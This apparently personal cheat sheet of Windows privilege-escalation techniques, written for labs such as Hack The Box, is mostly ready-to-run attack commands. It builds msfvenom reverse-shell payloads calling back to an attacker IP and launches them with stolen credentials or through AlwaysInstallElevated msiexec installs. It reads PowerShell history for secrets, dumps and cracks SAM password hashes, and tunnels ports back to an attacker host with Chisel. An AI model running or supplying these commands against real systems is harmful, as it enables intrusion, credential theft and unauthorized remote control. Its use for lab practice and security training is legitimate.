Recon

```
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```

```
https://github.com/itm4n/PrivescCheck
```

Forwarding service

[TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)

PowerShell history file

```cmd
REM location
cd C:\Users\<User Account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
REM file
type C:\Users\<User Account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

[LAN Manager authentication level](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)

- [NTLMv1 attack](https://github.com/SpiderLabs/Responder)

Check unusual programs

```
C:\Program Files
C:\Program Files (x86)
```

MSFVenom Reverse Shell Payload

```
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
```

reverse shell with credential

```cmd
REM create payload
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
REM change user, password and payload
powershell -c "$password = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<user>', $password);Start-Process -FilePath "<payload>" -Credential $creds"
```

File owner access permission 

```cmd
REM check owner
dir /q /a
REM grant full access
icacls <file> /grant <user>:F
```

AlwaysInstallElevated

```shell
# AlwaysInstallElevated set to 1 in HKLM!
# AlwaysInstallElevated set to 1 in HKCU! 
# using msfvenom to create payload
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f msi -o reverse.msi
```

execute the command on the target

```powershell
# <payload> = reverse.msi
msiexec /quiet /qn /i <payload>
```

SAM (SYSTEM account) (HTB:Omni)

```cmd
reg save HKLM\SYSTEM C:\SYSTEM
reg save HKLM\SAM C:\SAM
```

```shell
python3 secretsdump.py -system /tmp/SYSTEM -sam /tmp/SAM LOCAL
hashcat -m 1000 ./hash ~/Documents/rockyou.txt
```

[Chisel](https://github.com/jpillora/chisel) (port forwarding)

```shell
# client
chmod +x chisel
./chisel server --reverse --port <attacker port>
# Windows target
.\chisel.exe client <attacker ip>:<attacker port> R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
# attacker ip = 10.10.10.10
./chisel server --reverse --port 10000
.\chisel.exe client 10.10.10.10:10000 R:4444:localhost:3306 R:5555:localhost:3307
# attacker 
localhost 4444 => remote 3306
localhost 5555 => remote 3307
```

Tools

[Chisel](https://github.com/jpillora/chisel):Pivoting 

Exploits

- CVE-2021-1732
- MS10-059